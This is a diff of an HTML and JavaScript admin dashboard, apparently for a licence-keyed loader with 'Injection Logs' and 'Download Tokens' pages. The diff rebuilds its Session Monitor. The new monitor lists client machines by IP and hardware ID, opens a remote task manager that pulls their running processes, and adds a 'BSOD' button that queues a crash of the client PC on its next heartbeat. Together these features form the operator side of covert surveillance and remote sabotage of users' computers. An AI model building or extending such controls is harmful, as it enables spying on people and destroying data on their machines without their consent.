@@ -173,7 +173,7 @@ tr:hover td{background:rgba(74,222,128,0.02)}
         <div class="nav-item" data-page="injections"><svg><use href="#ico-zap"/></svg> Injection Logs</div>
         <div class="nav-item" data-page="logs"><svg><use href="#ico-list"/></svg> Auth Logs</div>
         <div class="nav-item" data-page="tokens"><svg><use href="#ico-inject"/></svg> Download Tokens</div>
-        <div class="nav-item" data-page="monitor"><svg><use href="#ico-zap"/></svg> Monitor</div>
+        <div class="nav-item" data-page="monitor"><svg><use href="#ico-users"/></svg> Monitor</div>
     </div>
     <div class="sidebar-footer"><span class="status-dot"></span>Server Online &nbsp;|&nbsp; <a href="/logout" style="color:var(--text3);text-decoration:none;font-size:11px">Logout</a></div>
     <div class="sidebar-footer" style="font-size:10px;color:var(--text3);padding-top:4px">Domain: <span id="public-domain">{{ domain }}</span></div>
@@ -296,58 +296,52 @@ tr:hover td{background:rgba(74,222,128,0.02)}
     <!-- ═══ MONITOR ═══ -->
     <div class="page" id="page-monitor">
         <div class="page-header">
-            <div><h1>Session Monitor</h1><p>View client system information, running processes, and remote actions</p></div>
-            <div style="display:flex;gap:8px;align-items:center">
-                <select id="monitor-session-select" onchange="onMonitorSessionChange()" style="background:var(--surface2);border:1px solid var(--border);border-radius:6px;padding:7px 12px;color:var(--text);font-size:12px;cursor:pointer;min-width:240px">
-                    <option value="">— Select a session —</option>
-                </select>
-                <button onclick="requestMonitorData()" style="background:var(--accent);color:#fff;border:none;border-radius:6px;padding:7px 16px;font-size:12px;cursor:pointer;white-space:nowrap">Request Data</button>
-            </div>
+            <div><h1>Session Monitor</h1><p>View active sessions, inspect running processes, and issue remote commands</p></div>
+            <button class="btn" onclick="loadMonitor()">Refresh</button>
         </div>
-
-        <!-- System Info Cards -->
-        <div id="monitor-info" style="display:none">
-            <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:12px;margin-bottom:16px">
-                <div class="stat-card"><div class="stat-label">Computer</div><div class="stat-value" id="mon-computer">—</div></div>
-                <div class="stat-card"><div class="stat-label">OS</div><div class="stat-value" id="mon-os" style="font-size:13px">—</div></div>
-                <div class="stat-card"><div class="stat-label">CPU</div><div class="stat-value" id="mon-cpu" style="font-size:13px">—</div></div>
-                <div class="stat-card"><div class="stat-label">RAM</div><div class="stat-value" id="mon-ram">—</div></div>
-                <div class="stat-card"><div class="stat-label">GPU</div><div class="stat-value" id="mon-gpu" style="font-size:13px">—</div></div>
-                <div class="stat-card"><div class="stat-label">Active Window</div><div class="stat-value" id="mon-window" style="font-size:13px">—</div></div>
-            </div>
-
-            <!-- Branded Task Manager -->
-            <div class="panel" style="margin-bottom:16px">
-                <div style="display:flex;justify-content:space-between;align-items:center;padding:12px 16px;border-bottom:1px solid var(--border)">
-                    <div style="display:flex;align-items:center;gap:8px">
-                        <span style="font-size:14px;font-weight:600;color:var(--text)">Process Manager</span>
-                        <span class="badge badge-blue" id="mon-proc-count">0 processes</span>
-                    </div>
-                    <div style="display:flex;gap:8px">
-                        <input type="text" id="mon-proc-filter" oninput="filterProcesses()" placeholder="Filter processes..." style="background:var(--surface2);border:1px solid var(--border);border-radius:6px;padding:5px 10px;color:var(--text);font-size:11px;width:180px">
-                    </div>
-                </div>
-                <div style="max-height:400px;overflow-y:auto">
-                    <table>
-                        <thead><tr><th>Name</th><th>PID</th><th>Memory (MB)</th><th>Threads</th></tr></thead>
-                        <tbody id="mon-proc-table"><tr><td colspan="4" class="empty-state">Select a session and request data</td></tr></tbody>
-                    </table>
-                </div>
-            </div>
-
-            <!-- Action Buttons -->
-            <div style="display:flex;gap:12px;align-items:center">
-                <button onclick="requestMonitorData()" style="background:var(--accent);color:#fff;border:none;border-radius:6px;padding:8px 20px;font-size:12px;cursor:pointer">Refresh Data</button>
-                <span id="mon-last-update" style="font-size:11px;color:var(--text3)">No data yet</span>
-                <div style="flex:1"></div>
-                <button onclick="confirmBSOD()" style="background:#dc2626;color:#fff;border:none;border-radius:6px;padding:8px 20px;font-size:12px;cursor:pointer;font-weight:600">⚠ BSOD</button>
-            </div>
-        </div>
-
-        <div id="monitor-empty" class="panel" style="padding:40px;text-align:center">
-            <p style="color:var(--text3);font-size:13px">Select an active session from the dropdown above, then click <strong>Request Data</strong> to view the client's system information and running processes.</p>
+        <div id="monitor-cards" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(380px,1fr));gap:16px">
+            <div class="empty-state" style="grid-column:1/-1;padding:40px;text-align:center;color:var(--text3)">Loading sessions...</div>
         </div>
     </div>
+
+</div>
+
+<!-- ═══ Task Manager Modal ═══ -->
+<div id="taskmanager-overlay" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:1000;justify-content:center;align-items:center" onclick="if(event.target===this)closeTaskManager()">
+<div style="background:var(--surface);border:1px solid var(--border);border-radius:12px;width:700px;max-height:80vh;display:flex;flex-direction:column;overflow:hidden">
+    <div style="padding:16px 20px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center">
+        <div style="display:flex;align-items:center;gap:10px">
+            <div style="width:32px;height:32px;background:linear-gradient(135deg,var(--accent),#7c3aed);border-radius:8px;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:12px;color:#fff">TM</div>
+            <div>
+                <div style="font-weight:600;color:var(--text);font-size:14px">Remote Task Manager</div>
+                <div style="font-size:11px;color:var(--text3)" id="tm-session-label">Session: —</div>
+            </div>
+        </div>
+        <div style="display:flex;gap:8px;align-items:center">
+            <span id="tm-collected-at" style="font-size:10px;color:var(--text3)"></span>
+            <button class="btn" onclick="closeTaskManager()" style="padding:4px 10px;font-size:12px">Close</button>
+        </div>
+    </div>
+    <div style="padding:12px 16px;border-bottom:1px solid var(--border);display:flex;gap:8px;align-items:center">
+        <input id="tm-search" type="text" placeholder="Search processes..." oninput="filterProcesses()" style="flex:1;background:var(--surface2);border:1px solid var(--border);border-radius:6px;padding:7px 12px;color:var(--text);font-size:12px">
+        <span id="tm-process-count" style="font-size:11px;color:var(--text3);white-space:nowrap">0 processes</span>
+    </div>
+    <div style="overflow-y:auto;max-height:55vh">
+        <table style="font-size:12px">
+            <thead><tr>
+                <th style="cursor:pointer" onclick="sortProcesses('name')">Process Name</th>
+                <th style="cursor:pointer;width:70px" onclick="sortProcesses('pid')">PID</th>
+                <th style="cursor:pointer" onclick="sortProcesses('mem')">Memory</th>
+                <th style="width:60px">Window</th>
+            </tr></thead>
+            <tbody id="tm-table"><tr><td colspan="4" class="empty-state">No data. Click "View Processes" to request a snapshot.</td></tr></tbody>
+        </table>
+    </div>
+    <div style="padding:10px 16px;border-top:1px solid var(--border);display:flex;justify-content:space-between;align-items:center">
+        <span style="font-size:10px;color:var(--text3)">Data from client machine — may be up to 10s stale</span>
+        <button class="btn" id="tm-refresh-btn" onclick="requestProcessRefresh()" style="font-size:11px;padding:5px 12px">Request Fresh Snapshot</button>
+    </div>
+</div>
 </div>
 
 <!-- ═══ Generate Key Modal ═══ -->
@@ -457,7 +451,7 @@ document.querySelectorAll('.nav-item').forEach(n => {
         if (page === 'injections') loadInjectionLogs();
         if (page === 'logs') loadLogs();
         if (page === 'tokens') loadTokens();
-        if (page === 'monitor') loadMonitorSessions();
+        if (page === 'monitor') loadMonitor();
     });
 });
 
@@ -794,130 +788,156 @@ async function loadTokens() {
 }
 
 /* ══════════════════════════════════════════════════════════════
- *  MONITOR
+ *  SESSION MONITOR
  * ══════════════════════════════════════════════════════════════ */
-let monitorProcesses = [];
-let monitorSessionId = '';
-let monitorPolling = null;
+let monitorSessionsCache = [];
+let tmCurrentSession = null;
+let tmProcesses = [];
+let tmSortKey = 'name';
+let tmSortAsc = true;
 
-async function loadMonitorSessions() {
+async function loadMonitor() {
     const r = await api('GET', '/sessions');
     if (!r?.sessions) return;
-    const sel = document.getElementById('monitor-session-select');
-    const prev = sel.value;
-    sel.innerHTML = '<option value="">— Select a session —</option>';
-    r.sessions.forEach(s => {
-        const label = `${s.key.substring(0,20)}... | ${s.ip} | ${fmtDate(s.last_seen)}`;
-        sel.innerHTML += `<option value="${s.id}">${label}</option>`;
-    });
-    if (prev) sel.value = prev;
-}
-
-function onMonitorSessionChange() {
-    const sid = document.getElementById('monitor-session-select').value;
-    monitorSessionId = sid;
-    if (!sid) {
-        document.getElementById('monitor-info').style.display = 'none';
-        document.getElementById('monitor-empty').style.display = '';
-        stopMonitorPolling();
+    monitorSessionsCache = r.sessions;
+    const container = document.getElementById('monitor-cards');
+    if (r.sessions.length === 0) {
+        container.innerHTML = '<div class="empty-state" style="grid-column:1/-1;padding:40px;text-align:center;color:var(--text3)">No active sessions</div>';
         return;
     }
-    document.getElementById('monitor-info').style.display = '';
-    document.getElementById('monitor-empty').style.display = 'none';
-    fetchMonitorData(sid);
-}
-
-async function requestMonitorData() {
-    const sid = document.getElementById('monitor-session-select').value;
-    if (!sid) { toast('Select a session first', 'error'); return; }
-    monitorSessionId = sid;
-    const r = await api('POST', '/monitor/request', { session_id: sid });
-    if (r?.success) {
-        toast('Monitor request sent — waiting for client response...');
-        document.getElementById('monitor-info').style.display = '';
-        document.getElementById('monitor-empty').style.display = 'none';
-        startMonitorPolling(sid);
-    } else {
-        toast(r?.message || 'Failed to send monitor request', 'error');
-    }
-}
-
-function startMonitorPolling(sid) {
-    stopMonitorPolling();
-    let attempts = 0;
-    monitorPolling = setInterval(async () => {
-        attempts++;
-        await fetchMonitorData(sid);
-        if (attempts > 12) stopMonitorPolling();
-    }, 3000);
-}
-
-function stopMonitorPolling() {
-    if (monitorPolling) { clearInterval(monitorPolling); monitorPolling = null; }
-}
-
-async function fetchMonitorData(sid) {
-    const r = await fetch('/api/admin/monitor/' + sid, { credentials: 'same-origin' });
-    if (r.status === 401) { window.location.href = '/login'; return; }
-    const data = await r.json();
-    if (!data?.success) return;
-    stopMonitorPolling();
-    renderMonitorData(data.data, data.timestamp);
-}
-
-function renderMonitorData(d, ts) {
-    document.getElementById('mon-computer').textContent = d.computer || '—';
-    document.getElementById('mon-os').textContent = d.os || '—';
-    document.getElementById('mon-cpu').textContent = d.cpu || '—';
-    document.getElementById('mon-ram').textContent = d.ram_used ? `${d.ram_used} / ${d.ram_total} MB` : '—';
-    document.getElementById('mon-gpu').textContent = d.gpu || '—';
-    document.getElementById('mon-window').textContent = d.active_window || '—';
-    document.getElementById('mon-last-update').textContent = 'Last update: ' + fmtDate(new Date(ts * 1000).toISOString());
-
-    monitorProcesses = d.processes || [];
-    document.getElementById('mon-proc-count').textContent = monitorProcesses.length + ' processes';
-    renderProcessTable(monitorProcesses);
-}
-
-function renderProcessTable(procs) {
-    const tbody = document.getElementById('mon-proc-table');
-    if (!procs.length) {
-        tbody.innerHTML = '<tr><td colspan="4" class="empty-state">No process data</td></tr>';
-        return;
-    }
-    const sorted = [...procs].sort((a, b) => (b.mem || 0) - (a.mem || 0));
-    tbody.innerHTML = sorted.map(p => {
-        const memMB = p.mem ? (p.mem / 1024 / 1024).toFixed(1) : '0.0';
-        return `<tr>
-            <td style="font-size:12px;font-weight:500">${escHtml(p.name)}</td>
-            <td style="font-size:11px;color:var(--text2)">${p.pid}</td>
-            <td style="font-size:11px">${memMB}</td>
-            <td style="font-size:11px;color:var(--text2)">${p.threads || '-'}</td>
-        </tr>`;
+    container.innerHTML = r.sessions.map(s => {
+        const age = Math.floor((Date.now()/1000 - new Date(s.created).getTime()/1000) / 60);
+        const ageStr = age < 60 ? age + 'm' : Math.floor(age/60) + 'h ' + (age%60) + 'm';
+        return `<div style="background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:18px;display:flex;flex-direction:column;gap:12px">
+            <div style="display:flex;justify-content:space-between;align-items:center">
+                <div style="display:flex;align-items:center;gap:10px">
+                    <div style="width:36px;height:36px;background:linear-gradient(135deg,var(--accent),#7c3aed);border-radius:8px;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:13px;color:#fff">${(s.key || '??').substring(0,2)}</div>
+                    <div>
+                        <div style="font-weight:600;font-size:13px;color:var(--text)">${s.key || 'Unknown'}</div>
+                        <div style="font-size:11px;color:var(--text3)">Session: ${s.id.substring(0,12)}...</div>
+                    </div>
+                </div>
+                <span class="badge badge-green">Active</span>
+            </div>
+            <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;font-size:11px">
+                <div style="color:var(--text3)">IP Address</div><div style="color:var(--text2);text-align:right">${s.ip}</div>
+                <div style="color:var(--text3)">HWID</div><div style="color:var(--text2);text-align:right;font-family:Consolas,monospace;font-size:10px">${(s.hwid||'').substring(0,16)}...</div>
+                <div style="color:var(--text3)">Session Age</div><div style="color:var(--text2);text-align:right">${ageStr}</div>
+                <div style="color:var(--text3)">Last Seen</div><div style="color:var(--text2);text-align:right">${fmtDate(s.last_seen)}</div>
+            </div>
+            <div style="display:flex;gap:8px;margin-top:4px">
+                <button class="btn" onclick="openTaskManager('${s.id}')" style="flex:1;font-size:11px;padding:7px 0">View Processes</button>
+                <button class="btn" onclick="confirmBsod('${s.id}','${(s.key||'?').replace(/'/g,'')}')" style="flex:1;font-size:11px;padding:7px 0;background:#dc2626;border-color:#dc2626;color:#fff">BSOD</button>
+            </div>
+        </div>`;
     }).join('');
 }
 
-function escHtml(s) { const d = document.createElement('div'); d.textContent = s; return d.innerHTML; }
-
-function filterProcesses() {
-    const q = document.getElementById('mon-proc-filter').value.toLowerCase();
-    const filtered = q ? monitorProcesses.filter(p => p.name.toLowerCase().includes(q)) : monitorProcesses;
-    renderProcessTable(filtered);
+function confirmBsod(sessionId, key) {
+    const confirmed = confirm(
+        'WARNING: This will trigger a Blue Screen of Death on the client machine.\\n\\n' +
+        'Session: ' + sessionId.substring(0,16) + '...\\n' +
+        'Key: ' + key + '\\n\\n' +
+        'This action is IRREVERSIBLE. The target PC will crash immediately on the next heartbeat (~10s).\\n\\n' +
+        'Are you absolutely sure?'
+    );
+    if (!confirmed) return;
+    const doubleConfirm = confirm('FINAL CONFIRMATION: Type OK to trigger BSOD on this machine. There is no undo.');
+    if (!doubleConfirm) return;
+    triggerBsod(sessionId);
 }
 
-async function confirmBSOD() {
-    const sid = document.getElementById('monitor-session-select').value;
-    if (!sid) { toast('Select a session first', 'error'); return; }
-    const confirmed = confirm('WARNING: This will cause a Blue Screen of Death (BSOD) on the client machine.\n\nThis action is IRREVERSIBLE and will crash their system immediately.\n\nAre you absolutely sure?');
-    if (!confirmed) return;
-    const doubleConfirm = confirm('FINAL CONFIRMATION:\n\nType OK to trigger BSOD on this session.\n\nThis CANNOT be undone.');
-    if (!doubleConfirm) return;
-    const r = await api('POST', '/bsod', { session_id: sid });
+async function triggerBsod(sessionId) {
+    const r = await api('POST', '/sessions/bsod', { session_id: sessionId });
     if (r?.success) {
-        toast('BSOD command queued — will execute on next heartbeat', 'success');
+        toast('BSOD command queued. Will trigger on next heartbeat (~10s).', 'success');
     } else {
-        toast(r?.message || 'Failed to send BSOD command', 'error');
+        toast(r?.message || 'Failed to issue BSOD', 'error');
     }
+}
+
+async function openTaskManager(sessionId) {
+    tmCurrentSession = sessionId;
+    document.getElementById('tm-session-label').textContent = 'Session: ' + sessionId.substring(0,16) + '...';
+    document.getElementById('taskmanager-overlay').style.display = 'flex';
+    document.getElementById('tm-search').value = '';
+
+    // Request fresh process data
+    await api('POST', '/sessions/request-processes', { session_id: sessionId });
+
+    // Try to load any cached data immediately
+    const r = await api('GET', '/sessions/' + sessionId + '/processes');
+    if (r?.processes?.length) {
+        tmProcesses = r.processes;
+        document.getElementById('tm-collected-at').textContent = r.collected_at ? 'Collected: ' + fmtDate(r.collected_at) : '';
+        renderProcessTable();
+    } else {
+        document.getElementById('tm-table').innerHTML = '<tr><td colspan="4" class="empty-state">Waiting for process data... (arrives on next heartbeat ~10s)</td></tr>';
+        document.getElementById('tm-collected-at').textContent = '';
+        document.getElementById('tm-process-count').textContent = '0 processes';
+    }
+
+    // Poll for fresh data
+    if (window._tmPoll) clearInterval(window._tmPoll);
+    window._tmPoll = setInterval(async () => {
+        if (!tmCurrentSession) { clearInterval(window._tmPoll); return; }
+        const rr = await api('GET', '/sessions/' + tmCurrentSession + '/processes');
+        if (rr?.processes?.length) {
+            tmProcesses = rr.processes;
+            document.getElementById('tm-collected-at').textContent = rr.collected_at ? 'Collected: ' + fmtDate(rr.collected_at) : '';
+            renderProcessTable();
+        }
+    }, 3000);
+}
+
+function closeTaskManager() {
+    tmCurrentSession = null;
+    document.getElementById('taskmanager-overlay').style.display = 'none';
+    if (window._tmPoll) clearInterval(window._tmPoll);
+}
+
+async function requestProcessRefresh() {
+    if (!tmCurrentSession) return;
+    await api('POST', '/sessions/request-processes', { session_id: tmCurrentSession });
+    toast('Process snapshot requested. Waiting for client response...', 'success');
+}
+
+function renderProcessTable() {
+    const search = (document.getElementById('tm-search').value || '').toLowerCase();
+    let filtered = tmProcesses.filter(p => !search || p.name.toLowerCase().includes(search));
+
+    filtered.sort((a, b) => {
+        let cmp = 0;
+        if (tmSortKey === 'name') cmp = a.name.localeCompare(b.name);
+        else if (tmSortKey === 'pid') cmp = a.pid - b.pid;
+        else if (tmSortKey === 'mem') cmp = (a.mem || 0) - (b.mem || 0);
+        return tmSortAsc ? cmp : -cmp;
+    });
+
+    const tbody = document.getElementById('tm-table');
+    if (filtered.length === 0) {
+        tbody.innerHTML = '<tr><td colspan="4" class="empty-state">No matching processes</td></tr>';
+    } else {
+        tbody.innerHTML = filtered.map(p => {
+            const memStr = p.mem ? (p.mem / 1024 / 1024).toFixed(1) + ' MB' : '-';
+            const winIcon = p.window ? '<span style="color:var(--accent)">&#9632;</span>' : '<span style="color:var(--text3)">-</span>';
+            return `<tr>
+                <td style="font-family:Consolas,monospace;font-size:12px">${p.name}</td>
+                <td style="color:var(--text2);font-size:12px">${p.pid}</td>
+                <td style="color:var(--text2);font-size:12px">${memStr}</td>
+                <td style="text-align:center">${winIcon}</td>
+            </tr>`;
+        }).join('');
+    }
+    document.getElementById('tm-process-count').textContent = filtered.length + ' / ' + tmProcesses.length + ' processes';
+}
+
+function filterProcesses() { renderProcessTable(); }
+
+function sortProcesses(key) {
+    if (tmSortKey === key) tmSortAsc = !tmSortAsc;
+    else { tmSortKey = key; tmSortAsc = true; }
+    renderProcessTable();
 }
 
 /* ── Modal close on overlay click ── */
@@ -933,7 +953,7 @@ setInterval(() => {
     if (active?.id === 'page-sessions') loadSessions();
     if (active?.id === 'page-injections') loadInjectionLogs();
     if (active?.id === 'page-tokens') loadTokens();
-    if (active?.id === 'page-monitor') loadMonitorSessions();
+    if (active?.id === 'page-monitor') loadMonitor();
 }, 10000);
 </script>
 </body>
